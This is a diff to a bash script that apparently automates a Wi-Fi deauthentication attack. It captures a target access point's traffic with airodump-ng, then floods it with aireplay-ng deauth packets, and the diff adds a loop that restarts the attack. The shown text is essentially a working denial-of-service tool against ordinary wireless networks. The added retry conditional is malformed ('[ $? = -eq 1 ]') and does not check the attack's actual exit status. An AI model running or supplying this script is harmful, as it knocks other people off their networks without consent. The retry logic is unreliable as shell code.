@@ -592,15 +592,23 @@ read -p 'channel : ' chanelda
 echo -e  '\e[1;37m '
 echo
 echo
-n_secondes=9
-( xterm -title wait... -e "airodump-ng --bssid $bssidda -c $chanelda $interfaceda >> lewifi1234.txt") & 
-sleep 9
+n_secondes=5
+( xterm -title wait... -e "airodump-ng --bssid $bssidda -c $chanelda $interfaceda") & 
+sleep 5
 kill $!
 clear
 echo -e  '\e[1;32m '
+xterm -title wait... -e "airodump-ng --bssid $bssidda -c $chanelda $interfaceda" &
 echo attack started ... 
-xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda 
-rm -r -f lewifi1234.txt
+xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda
+      
+      if [ $? = -eq 1 ]
+      then
+          while [ $? -ne "1" ]
+          do
+          xterm -title "Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda $interfaceda
+          done
+      fi
 fi
 
 
